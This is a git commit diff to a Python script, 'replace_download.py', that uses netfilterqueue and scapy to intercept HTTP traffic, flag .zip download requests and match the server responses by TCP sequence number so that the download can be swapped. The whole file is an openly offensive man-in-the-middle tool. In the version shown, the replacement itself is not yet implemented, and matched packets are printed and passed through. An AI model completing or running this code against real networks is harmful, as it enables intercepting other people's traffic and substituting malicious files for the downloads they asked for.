873aeb0e93e5e84757e9beb41089e036c0496c74
arjunkulkarni0208 <52421926+arjunkulkarni0208@users.noreply.github.com>
2024-08-12 11:32:25 -0400

    replace_download.py

--- replace_download.py
+++ replace_download.py
@@ -2,20 +2,25 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] .zip Request")
             load = str(scapy_packet[scapy.Raw].load)
             if ".zip" in load:
-                print(load)
+                print("[+] zip Request")
+                print(scapy_packet.show())
+                ack_list.append(scapy_packet[scapy.TCP].ack)
 
-#           print(scapy_packet.show())
-#       elif scapy_packet[scapy.TCP].sport == 80:
-#           print("HTTP Response")
-#           print(scapy_packet.show())
+            print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            seq = scapy_packet[scapy.TCP].seq
+            if seq in ack_list:
+                print("[+] Replacing Download")
+                ack_list.remove(seq)
+                print(scapy_packet.show())
 
     packet.accept()
 
